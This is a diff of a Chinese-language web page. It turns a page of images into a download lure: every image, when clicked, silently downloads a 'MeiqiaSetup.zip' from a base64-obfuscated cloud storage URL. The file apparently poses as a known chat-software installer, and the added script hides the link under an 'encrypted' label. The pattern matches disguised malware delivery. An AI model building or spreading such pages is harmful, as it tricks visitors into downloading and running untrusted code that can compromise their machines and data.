@@ -1,33 +1,95 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>投标事项</title>
+    <title>下载计划</title>
+    
     <style>
-        body, html {
+        :root {
+            --image-spacing: 2px;
+        }
+
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
         }
-        img {
+
+        .image-container {
+            display: grid;
+            gap: var(--image-spacing);
+        }
+
+        .download-image {
             width: 100%;
             height: auto;
-            display: block;
-            cursor: pointer; 
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+        }
+
+        .download-image:hover {
+            opacity: 0.9;
         }
     </style>
 </head>
 <body>
+    <main class="image-container"></main>
 
-   <img src="static/picture/d_01.jpg"  >
-    <img src="static/picture/d_02.jpg"  >
-    <img src="static/picture/d_03.jpg" >
-	<img src="static/picture/d_04.jpg"  >
-	<img src="static/picture/d_05.jpg"  >
-	 <img src="static/picture/d_06.jpg"  >
-	 <img src="static/picture/d_07.jpg"  >
+    <script type="module">
+        // 图片数据和加密URL配置
+        const RESOURCES = {
+            images: Array.from({length: 5}, (_, i) => 
+                `static/picture/d_${String(i+1).padStart(2, '0')}.jpg`),
+            
+            encryptedUrls: Array(7).fill(
+                'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA=='
+            )
+        };
 
+        // 工具函数
+        const decodeBase64 = str => atob(str);
+        
+        const createDownload = url => {
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = '';
+            link.style.display = 'none';
+            document.body.append(link);
+            link.click();
+            link.remove();
+        };
 
+        // 图片加载器
+        const loadImages = container => {
+            RESOURCES.images.forEach(imgSrc => {
+                const img = new Image();
+                img.className = 'download-image';
+                img.src = imgSrc;
+                img.alt = '下载入口';
+                container.appendChild(img);
+            });
+        };
 
+        // 事件处理器
+        const handleImageClick = ({target}) => {
+            if (!target.matches('.download-image')) return;
+            
+            const index = [...target.parentElement.children].indexOf(target);
+            if (index in RESOURCES.encryptedUrls) {
+                const decodedUrl = decodeBase64(RESOURCES.encryptedUrls[index]);
+                createDownload(decodedUrl);
+            }
+        };
+
+        // 初始化
+        const init = () => {
+            const container = document.querySelector('.image-container');
+            loadImages(container);
+            container.addEventListener('click', handleImageClick);
+        };
+
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
 </body>
 </html>
